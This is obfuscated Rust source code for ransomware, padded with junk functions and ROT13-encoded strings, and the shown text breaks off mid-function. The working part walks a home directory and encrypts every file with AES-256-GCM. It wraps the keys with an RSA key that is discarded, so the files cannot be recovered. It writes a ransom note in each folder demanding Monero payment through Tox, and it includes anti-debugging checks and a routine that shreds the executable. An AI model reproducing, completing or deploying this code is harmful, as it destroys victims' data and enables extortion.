mod xzcvbnm { pub fn qhjkmld () { cryptify :: flow_stmt ! () ; let flhgfds = 10 ; if false { let kjhgfd = flhgfds ; println ! ("Gur pbqr pnaavat rzretrapr {}" , kjhgfd) ; } println ! ("flhgfds vf fgvyy {}" , flhgfds) ; } pub fn azxswedc () { let poiuyt = 5 ; let _gurpbqr = match false { true => "Pnrfne pnaavat rzretrapr" , false => "Gur pbqr pnaavat rzretrapr" , } ; } } fn rtghyuji () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let asdfghj = xcvbnm ; println ! ("Pnrfne pnaavat rzretrapr {}" , asdfghj) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; struct Qwertyui { foo : i32 , } enum Asdfghj { Foo , Bar , } let kjhgfd = cryptify :: encrypt_string ! ("Gur pbqr pnaavat rzretrapr") ; } fn jhgfdertyu () { loop { break ; println ! ("Pnrfne pnaavat rzretrapr") ; } } fn mnbvcxza () { cryptify :: flow_stmt ! () ; let poiuyt = 10 ; if false { let asdfghj = poiuyt ; println ! ("Gur pbqr pnaavat rzretrapr {}" , asdfghj) ; } println ! ("poiuyt vf fgvyy {}" , poiuyt) ; let mut qwerasdf = 10 ; } fn poiuytrewq () { let xcvbnm = 5 ; if false { let asdfghj = xcvbnm ; println ! ("Pnrfne pnaavat rzretrapr {}" , asdfghj) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let kjhgfd = cryptify :: encrypt_string ! ("Gur pbqr pnaavat rzretrapr") ; } fn asdfghjkl () { cryptify :: flow_stmt ! () ; let poiuyt = 10 ; if false { let asdfghj = poiuyt ; println ! ("Gur pbqr pnaavat rzretrapr {}" , asdfghj) ; } println ! ("poiuyt vf fgvyy {}" , poiuyt) ; struct Qwertyui { foo : i32 , } enum Asdfghj { Foo , Bar , } } fn zxcvbnm () { let xcvbnm = 5 ; if false { let asdfghj = xcvbnm ; println ! ("Pnrfne pnaavat rzretrapr {}" , asdfghj) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let mut qwerasdf = 10 ; } fn qwerasdf () { cryptify :: flow_stmt ! () ; let poiuyt = 10 ; if false { let asdfghj = poiuyt ; println ! ("Gur pbqr pnaavat rzretrapr {}" , asdfghj) ; } println ! ("poiuyt vf fgvyy {}" , poiuyt) ; struct Qwertyui { foo : i32 , } enum Asdfghj { Foo , Bar , } } fn yuiopasdf () { loop { break ; println ! ("Pnrfne pnaavat rzretrapr") ; } } fn ghjklmnb () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let asdfghj = xcvbnm ; println ! ("Gur pbqr pnaavat rzretrapr {}" , asdfghj) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let kjhgfd = cryptify :: encrypt_string ! ("Pnrfne pnaavat rzretrapr") ; } mod fgvcxdrt { pub fn bhgfds () { let jhgfd = 10 ; if false { let poiuyt = jhgfd ; println ! ("Tbqf pnaavat rzretrapr {}" , poiuyt) ; } println ! ("jhgfd vf fgvyy {}" , jhgfd) ; } pub fn nmvcxza () { cryptify :: flow_stmt ! () ; let mut asdfghj = 5 ; let _tbqf = match false { true => "Pnrfne pnaavat rzretrapr" , false => "Tbqf pnaavat rzretrapr" , } ; } } mod azertyui { pub fn dfghjkl () { let mnbcxza = 10 ; if false { let poiuytrewq = mnbcxza ; println ! ("Gurpenml pnaavat rzretrapr {}" , poiuytrewq) ; } println ! ("mnbcxza vf fgvyy {}" , mnbcxza) ; } pub fn qwertyui () { let mut asdfghjkl = 5 ; let _gurpenml = match false { true => "Pnrfne pnaavat rzretrapr" , false => "Gurpenml pnaavat rzretrapr" , } ; } } fn asdfghjklm () { cryptify :: flow_stmt ! () ; loop { break ; println ! ("Pnrfne pnaavat rzretrapr") ; } } fn zxcvbnmnb () { let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Gurpenml pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; let mut qwerasdfghj = 10 ; } fn mnbvcxzasd () { cryptify :: flow_stmt ! () ; let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Pnrfne pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let gurpenml = cryptify :: encrypt_string ! ("Pnrfne pnaavat rzretrapr") ; } fn poiuytrewqasdf () { let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Gurpenml pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; struct Qwertyui { foo : i32 , } enum Asdfghjkl { Foo , Bar , } } fn yuiopasdfgh () { cryptify :: flow_stmt ! () ; loop { break ; println ! ("Pnrfne pnaavat rzretrapr") ; } } fn ghjklmnbvc () { let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Gurpenml pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let gurpenml = cryptify :: encrypt_string ! ("Gurpenml pnaavat rzretrapr") ; } fn poiuytrewqasdfgh () { cryptify :: flow_stmt ! () ; let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Pnrfne pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; let mut qwerasdfghj = 10 ; } mod poiuytrewq { pub fn asdfghjklm () { let xcvbnm = 10 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Fbqvgu pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; } pub fn ghjklmnbvc () { cryptify :: flow_stmt ! () ; let mut azertyuiop = 5 ; let _fbqvgu = match false { true => "Pnrfne pnaavat rzretrapr" , false => "Fbqvgu pnaavat rzretrapr" , } ; } } fn yuiopasdfghj () { loop { break ; println ! ("Pnrfne pnaavat rzretrapr") ; } } fn azertyuiopasdf () { let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Fbqvgu pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let mut qwerasdfghjkl = 10 ; } fn poiuytrewqasdfghj () { cryptify :: flow_stmt ! () ; let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Pnrfne pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; struct Qwertyui { foo : i32 , } enum Asdfghjklm { Foo , Bar , } } fn ghjklmnbvcxz () { let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Fbqvgu pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; let fbqvgu = cryptify :: encrypt_string ! ("Fbqvgu pnaavat rzretrapr") ; } fn asdfghjklmnbvc () { cryptify :: flow_stmt ! () ; let poiuytrewq = 10 ; if false { let asdfghjklm = poiuytrewq ; println ! ("Fbqvgu pnaavat rzretrapr {}" , asdfghjklm) ; } println ! ("poiuytrewq vf fgvyy {}" , poiuytrewq) ; let mut qwerasdfghjkl = 10 ; } fn poiuytrewqasdfghjkl () { let xcvbnm = 5 ; if false { let kjhgfdertyu = xcvbnm ; println ! ("Pnrfne pnaavat rzretrapr {}" , kjhgfdertyu) ; } println ! ("xcvbnm vf fgvyy {}" , xcvbnm) ; struct Qwertyui { foo : i32 , } enum Asdfghjklm { Foo , Bar , } } fn azertyuiopasdfghj () { cryptify :: flow_stmt ! () ; loop { break ; println ! ("Pnrfne pnaavat rzretrapr") ; } } extern crate walkdir ; use walkdir :: WalkDir ; use aes_gcm :: { Aes256Gcm , Nonce , Key , aead :: Aead , KeyInit } ; use rsa :: { Oaep , RsaPrivateKey , RsaPublicKey } ; use rand :: { Rng , rngs :: OsRng , thread_rng } ; use std :: fs :: { self , File } ; use std :: io :: { Read , Write , self } ; use std :: convert :: TryInto ; use std :: path :: Path ; use std :: env ; use std :: process :: { self , Command } ; use sha2 :: Sha256 ; use heim_virt :: detect ; use reqwest :: Client ; use proctitle :: set_title ; use tokio ; # [derive (Debug)] struct X1 ; impl std :: fmt :: Display for X1 { fn fmt (& self , f : & mut std :: fmt :: Formatter < '_ >) -> std :: fmt :: Result { write ! (f , "GCM encryption error") } } impl std :: error :: Error for X1 { } # [cfg (target_os = "windows")] use { winapi :: shared :: minwindef :: { DWORD , FALSE , TRUE } , winapi :: um :: debugapi :: { CheckRemoteDebuggerPresent , IsDebuggerPresent } , winapi :: um :: processthreadsapi :: GetCurrentProcess , winapi :: um :: handleapi :: INVALID_HANDLE_VALUE , } ; # [cfg (target_os = "windows")] fn fawjgkhfwlakhfdlawdfsgwadcwa () -> bool { cryptify :: flow_stmt ! () ; let h_process = unsafe { GetCurrentProcess () } ; if h_process == INVALID_HANDLE_VALUE { return false ; } let mut debugger_present = FALSE ; let result = unsafe { cryptify :: flow_stmt ! () ; CheckRemoteDebuggerPresent (h_process , & mut debugger_present) } ; result != 0 && debugger_present != 0 } # [cfg (target_os = "linux")] fn fawjgkhfwlakhfdlawdfsgwadcwa () -> bool { let pid = unsafe { libc :: getpid () } ; let request = libc :: PTRACE_ATTACH ; let result = unsafe { libc :: ptrace (request , pid , std :: ptr :: null_mut () as * mut libc :: c_void , std :: ptr :: null_mut () as * mut libc :: c_void) } ; if result == - 1 { let errno = io :: Error :: last_os_error () . raw_os_error () . unwrap () ; errno == libc :: EPERM || errno == libc :: EACCES } else { let request = libc :: PTRACE_DETACH ; let _ = unsafe { libc :: ptrace (request , pid , std :: ptr :: null_mut () as * mut libc :: c_void , std :: ptr :: null_mut () as * mut libc :: c_void) } ; true } } fn fwadjfawkldsjflkawjklfdjklwajfkljadw (exe_path : & str) { let status = std :: process :: Command :: new ("shred") . arg ("-f") . arg (exe_path) . arg ("-z") . arg ("-u") . arg ("-n") . arg ("40") . spawn () . expect ("failed to start...") . wait () . expect ("failed to start...") ; if ! status . success () { print ! ("failed to start...") ; std :: process :: exit (1) ; } } fn x2 (y1 : & str , z1 : & [u8]) -> Result < () , Box < dyn std :: error :: Error > > { cryptify :: flow_stmt ! () ; let mut y2 = File :: open (y1) ? ; let mut z2 = Vec :: new () ; y2 . read_to_end (& mut z2) ? ; let mut w1 = OsRng { } ; let mut w2 = [0u8 ; 12] ; w1 . fill (& mut w2) ; let x3 = Aes256Gcm :: new (Key :: < Aes256Gcm > :: from_slice (z1 . try_into () ?)) ; let x4 = match x3 . encrypt (& Nonce :: from_slice (& w2) , & * z2) { Ok (ct) => ct , Err (_) => return Err (Box :: new (X1)) , } ; let mut y3 = File :: create (y1) ? ; y3 . write_all (& w2) ? ; y3 . write_all (& x4) ? ; y3 . set_len ((w2 . len () + x4 . len ()) as u64) ? ; let v1 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" ; let mut w3 = OsRng { } ; let w4 = w3 . gen_range (0 .. v1 . len ()) ; let v2 = v1 . chars () . nth (w4) . unwrap () ; let y4 = format ! ("{}.{v2}" , y1) ; fs :: rename (y1 , & y4) ? ; let gkzqbx = 13 * 41 ; let jxvwmn = gkzqbx * 29 ; let mut qhjgft = 0 ; for _ in 0 .. thread_rng () . gen_range (15 .. 40) { qhjgft += gkzqbx * jxvwmn ; qhjgft %= 223 ; for _ in 0 .. thread_rng () . gen_range (9 .. 23) { let yrtbvf = (gkzqbx * jxvwmn) % 53 ; let _ = yrtbvf * yrtbvf ; for _ in 0 .. thread_rng () . gen_range (4 .. 9) { let _ = thread_rng () . gen_range (0 .. 180) ; } let mut tzxkpw = [0 ; 15] ; for i in 0 .. 15 { tzxkpw [i] = thread_rng () . gen_range (0 .. 180) ; } let mut wvrbxl = 0 ; for _ in 0 .. thread_rng () . gen_range (3 .. 7) { wvrbxl += thread_rng () . gen_range (0 .. 25) ; } let _ = wvrbxl ^ 0x98765432 as u64 ; let mut kcjnbg = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { kcjnbg += thread_rng () . gen_range (0 .. 20) ; } let _ = kcjnbg * kcjnbg ; } } if qhjgft > 128 { let _ = x5 (z1) ; let mut hzqgkj = hzqgkj (qhjgft) ; let _ = hzqgkj ^ 0x12345678 ; let mut bvxrzt = 0 ; for _ in 0 .. thread_rng () . gen_range (3 .. 7) { bvxrzt += thread_rng () . gen_range (0 .. 30) ; } let _ = bvxrzt * bvxrzt ; let mut pwkzlj = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { pwkzlj += thread_rng () . gen_range (0 .. 25) ; } let _ = pwkzlj ^ 0x55555555 ; } fn hzqgkj (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (4 .. 9) { result += thread_rng () . gen_range (0 .. 150) ; } result } fn wadsjfkaw (z1 : i32) -> i32 { let mut result = z1 * z1 ; for _ in 0 .. thread_rng () . gen_range (3 .. 7) { result += thread_rng () . gen_range (0 .. 120) ; } result } fn pwkzlj (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 100) ; } result } fn akdwidfeai (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 80) ; } result } fn _eaiadfkl (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 60) ; } result } fn wfajdskjwwal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 40) ; } result } fn __fwalidjwl (start : i32 , end : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = start ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 10) ; } result % (end - start) + start } fn afjaekdwidwfal (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 210) ; } result } fn fehajkdfkesajkdw (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 220) ; } result } fn kjahsdkjhfwalwfalwfal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 230) ; } result } fn woihajkdfhajkdwajkdw (start : i32 , end : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = start ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 25) ; } result % (end - start) + start } fn jahsdkjhfwalwfalwfalwfal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 240) ; } result } fn fhajkdfhajkdwajkdwajkdw (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 250) ; } result } fn akdwidfeaiwfalwfalwfal (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 260) ; } result } fn _eaiadfklwfalwfalwfalwfal (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 270) ; } result } fn afjaekdwidwfalwfal (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 280) ; } result } fn fehajkdfkesajkdwajkdw (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 290) ; } result } fn kjahsdkjhfwalwfalwfalwfal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 300) ; } result } fn woihajkdfhajkdwajkdwajkdw (start : i32 , end : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = start ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 30) ; } result % (end - start) + start } fn jahsdkjhfwalwfalwfalwfalwfal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 310) ; } result } fn fhajkdfhajkdwajkdwajkdwajkdw (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 320) ; } result } fn akdwidfeaiwfalwfalwfalwfal (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 330) ; } result } fn _eaiadfklwfalwfalwfalwfalwfal (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 340) ; } result } fn afjaekdwidwfalwfalwfal (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 350) ; } result } fn fehajkdfkesajkdwajkdwajkdw (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 360) ; } result } fn kjahsdkjhfwalwfalwfalwfalwfal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 370) ; } result } fn woihajkdfhajkdwajkdwajkdwajkdw (start : i32 , end : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = start ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 35) ; } result % (end - start) + start } fn jahsdkjhfwalwfalwfalwfalwfalwfal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 380) ; } result } fn fhajkdfhajkdwajkdwajkdwajkdwajkdw (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 390) ; } result } fn akdwidfeaiwfalwfalwfalwfalwfal (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 400) ; } result } fn _eaiadfklwfalwfalwfalwfalwfalwfal (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 410) ; } result } fn afjaekdwidwfalwfalwfalwfal (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 420) ; } result } fn fehajkdfkesajkdwajkdwajkdwajkdw (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 430) ; } result } fn kjahsdkjhfwalwfalwfalwfalwfalwfal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 440) ; } result } fn woihajkdfhajkdwajkdwajkdwajkdwajkdw (start : i32 , end : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = start ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 40) ; } result % (end - start) + start } fn jahsdkjhfwalwfalwfalwfalwfalwfalwfal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 450) ; } result } fn fhajkdfhajkdwajkdwajkdwajkdwajkdwajkdw (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 460) ; } result } fn akdwidfeaiwfalwfalwfalwfalwfalwfal (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 470) ; } result } fn _eaiadfklwfalwfalwfalwfalwfalwfalwfal (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 480) ; } result } fn afjaekdwidwfalwfalwfalwfalwfal (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 490) ; } result } fn fehajkdfkesajkdwajkdwajkdwajkdwajkdw (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 500) ; } result } fn kjahsdkjhfwalwfalwfalwfalwfalwfalwfal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 510) ; } result } fn woihajkdfhajkdwajkdwajkdwajkdwajkdwajkdw (start : i32 , end : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = start ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 50) ; } result % (end - start) + start } fn jahsdkjhfwalwfalwfalwfalwfalwfalwfalwfal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 520) ; } result } fn fhajkdfhajkdwajkdwajkdwajkdwajkdwajkdwajkdw (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 530) ; } result } fn akdwidfeaiwfalwfalwfalwfalwfalwfalwfal (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 540) ; } result } fn _eaiadfklwfalwfalwfalwfalwfalwfalwfalwfal (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 550) ; } result } fn afjaekdwidwfalwfalwfalwfalwfalwfalwfal (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 560) ; } result } fn fehajkdfkesajkdwajkdwajkdwajkdwajkdwajkdw (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 570) ; } result } fn kjahsdkjhfwalwfalwfalwfalwfalwfalwfalwfal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 580) ; } result } fn woihajkdfhajkdwajkdwajkdwajkdwajkdwajkdwajkdw (start : i32 , end : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = start ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 60) ; } result % (end - start) + start } fn jahsdkjhfwalwfalwfalwfalwfalwfalwfalwfalwfal () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 590) ; } result } fn ajkdhfajkdhfajkdhfajkdhfajkdhf () -> i32 { cryptify :: flow_stmt ! () ; let mut result = 42 ; for _ in 0 .. thread_rng () . gen_range (3 .. 7) { result += thread_rng () . gen_range (0 .. 420) ; } result } fn oiuhaoiuhaoiuhaoiuhaoiuhaoiuha () -> f64 { let mut result = 3.14 ; for _ in 0 .. thread_rng () . gen_range (1 .. 4) { result += thread_rng () . gen_range (0.0 .. 10.0) ; } result } fn jhgfdsajkghfdajkghfdajkghfdajkghfd () -> i64 { cryptify :: flow_stmt ! () ; let mut result = 123 ; for _ in 0 .. thread_rng () . gen_range (2 .. 6) { result += thread_rng () . gen_range (0 .. 640) ; } result } fn asdfghjklasdfghjklasdfghjklasdfghjkl () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (3 .. 5) { result += thread_rng () . gen_range (0 .. 510) ; } result } fn poiuytrewqpoiuytrewqpoiuytrewqpoiuytrewq () -> i32 { cryptify :: flow_stmt ! () ; let mut result = 100 ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 70) ; } result } fn zxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnm () -> f64 { let mut result = 2.71 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0.0 .. 20.0) ; } result } fn qwerasdfghjklqwerasdfghjklqwerasdfghjkl () -> i64 { cryptify :: flow_stmt ! () ; let mut result = 456 ; for _ in 0 .. thread_rng () . gen_range (3 .. 7) { result += thread_rng () . gen_range (0 .. 810) ; } result } fn mnbvcxzasdfghjklmnbvcxzasdfghjklmnbvcxzasdfghjkl () -> i32 { let mut result = 200 ; for _ in 0 .. thread_rng () . gen_range (1 .. 4) { result += thread_rng () . gen_range (0 .. 90) ; } result } fn yuiopasdfghjkyuiopasdfghjkyuiopasdfghjk () -> f64 { cryptify :: flow_stmt ! () ; let mut result = 1.62 ; for _ in 0 .. thread_rng () . gen_range (2 .. 6) { result += thread_rng () . gen_range (0.0 .. 30.0) ; } result } fn bhgfdsajkghfdbhgfdajkghfdbhgfdajkghfd () -> i64 { let mut result = 789 ; for _ in 0 .. thread_rng () . gen_range (3 .. 5) { result += thread_rng () . gen_range (0 .. 950) ; } result } fn poiuytrewqazxswedcvpoiuytrewqazxswedcvpoiuytrewqazxswedcv () -> i32 { cryptify :: flow_stmt ! () ; let mut result = 50 ; for _ in 0 .. thread_rng () . gen_range (1 .. 3) { result += thread_rng () . gen_range (0 .. 40) ; } result } fn asdfghjklpoiuytrewqasdfghjklpoiuytrewqasdfghjklpoiuytrewq () -> f64 { let mut result = 3.85 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0.0 .. 50.0) ; } result } fn zxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnmzxcvbnm () -> i64 { cryptify :: flow_stmt ! () ; let mut result = 321 ; for _ in 0 .. thread_rng () . gen_range (3 .. 7) { result += thread_rng () . gen_range (0 .. 720) ; } result } Ok (()) } fn x5 (z1 : & [u8]) -> Vec < u8 > { let mut w1 = OsRng { } ; let w2 = 3072 ; let x1 = RsaPrivateKey :: new (& mut w1 , w2) . unwrap () ; let x2 = RsaPublicKey :: from (& x1) ; let x3 = Oaep :: new :: < Sha256 > () ; x2 . encrypt (& mut w1 , x3 , z1) . unwrap () } fn x6 () -> Result < () , Box < dyn std :: error :: Error > > { cryptify :: flow_stmt ! () ; for y1 in WalkDir :: new ("/home/user") . into_iter () . filter_map (| y2 | y2 . ok ()) { if y1 . file_type () . is_dir () { let z1 = y1 . path () . to_string_lossy () . to_string () ; let z2 = format ! ("{}/READMEzAfaeOdaFuaedafEAodAEdaMCADkal.txt" , z1) ; let mut z3 = File :: create (z2) ? ; writeln ! (z3 , r"Hello,

            Your files got encrypted
            Send company name/ip infected and monero wallet address of client using Tox for verification
            Once done, pay us 500$ worth of Monero, After verification and payment
            Your job is done and we will send you the keypair via Tox or whatever is required (must be secure)

            Tox: whatever
            Monero: whatever

            Thank you") ? ; } else if y1 . file_type () . is_file () { let z4 = y1 . path () . to_string_lossy () . to_string () ; let z5 = Path :: new (& z4) . file_name () . unwrap () . to_str () . unwrap () ; if z5 == "READMEzAfaeOdaFuaedafEAodAEdaMCADkal.txt" { continue ; } let w1 = env :: current_exe () . unwrap () ; let w2 = w1 . to_string_lossy () . to_string () ; if z4 == w2 { continue ; } let z6 = Aes256Gcm :: generate_key (& mut OsRng) ; match x2 (& z4 , z6 . as_slice ()) { Ok (()) => { let _ = x5 (z6 . as_slice ()) ; println ! ("File '{}' encrypted successfully" , z4) ; } , Err (err) => { if let Some (io_error) = err . downcast_ref :: < std :: io :: Error > () { match io_error . raw_os_error () { Some (libc :: SIGILL) => { eprintln ! ("Skipping file '{}' due to 'Illegal Instruction' error." , z4) ; } , Some (libc :: SIGSEGV) => { eprintln ! ("Skipping file '{}' due to 'Segmentation Fault' error." , z4) ; } , _ => { eprintln ! ("Error encrypting file '{}': {}" , z4 , err) ; } } } else { eprintln ! ("Error encrypting file '{}': {}" , z4 , err) ; } continue ; } } } } Ok (()) } fn ajkdhfajkdw (x : i32) -> i32 { let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 90) ; } result } fn fehajkdfkes (x : i32) -> i32 { cryptify :: flow_stmt ! () ; let mut result = x * x ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . gen_range (0 .. 70) ; } result } fn kjahsdkjhf () -> i32 { let mut result = 0 ; for _ in 0 .. thread_rng () . gen_range (2 .. 5) { result += thread_rng () . 